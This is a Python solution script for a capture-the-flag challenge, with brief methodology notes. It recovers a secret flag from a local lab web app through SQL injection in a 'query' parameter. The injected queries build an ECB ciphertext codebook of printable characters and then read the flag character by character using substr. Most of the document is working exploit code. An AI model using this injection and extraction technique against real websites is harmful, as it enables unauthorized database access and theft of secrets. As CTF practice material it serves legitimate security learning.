"""
#Objective: hack this website and crack the encrypted_flag to win

#Metedology: we have sqli so encrypt first char in flag and compare with all character you encrepted before if the encrypted both are same so search in your dictionary about the plain of this encryption character

#Lesson&Mistakes: 
    1- i can't search enough in DB for anything that can extract flag_index from the sqli
    2- write what is the thing is it happen you will solve this challenge


# ECB CPA over HTTP
# Methodology:
# 1- Build codebook
# 2- Extract encrypted flag chars
# 3- Compare ciphertexts
# 4- Recover flag char by char

"""
#POC

import requests
import re
import string

URL = "http://challenge.localhost:80"


def extract_cipher(resp_text):
    """
    Extract:
    <b>Results:</b><pre>....</pre>
    """

    pattern = r"Results:</b><pre>(.*?)</pre>"

    match = re.search(pattern, resp_text, re.S)

    if not match:
        print(resp_text)
        raise Exception("cipher not found")

    return match.group(1).strip()


def encrypt_char(char):
    """
    Example:
    SELECT 'A' FROM secrets
    """

    payload = f"'{char}'"

    resp = requests.get(
        URL,
        params={"query": payload}
    )

    cipher = extract_cipher(resp.text)

    return cipher


def build_codebook():

    codebook = {}

    for i in range(32, 127):

        char = chr(i)

        # chars break SQL syntax
        if char in ["'", '"', "\\"]:
            continue

        cipher = encrypt_char(char)

        codebook[cipher] = char

        print(f"[*] {repr(char)} => {cipher}")

    return codebook


def get_flag_char(index):
    """
    SQL:
    SELECT substr(flag,1,1) FROM secrets

    SQLite starts from index 1
    """

    payload = f"substr(flag,{index},1)"

    resp = requests.get(
        URL,
        params={"query": payload}
    )

    cipher = extract_cipher(resp.text)

    return cipher


def decrypt_flag():

    print("[*] Building codebook...\n")

    codebook = build_codebook()

    print("\n[*] Recovering flag...\n")

    flag = ""

    i = 1

    while True:

        encrypted_char = get_flag_char(i)

        if encrypted_char in codebook:

            plain = codebook[encrypted_char]

            flag += plain

            print(f"[+] Index {i} => {plain}")

            if plain == "}":
                break

        else:

            print(f"[!] Unknown ciphertext: {encrypted_char}")

            flag += "?"

        i += 1

    print(f"\n[+] FLAG: {flag}")

    return flag


if __name__ == "__main__":

    decrypt_flag()
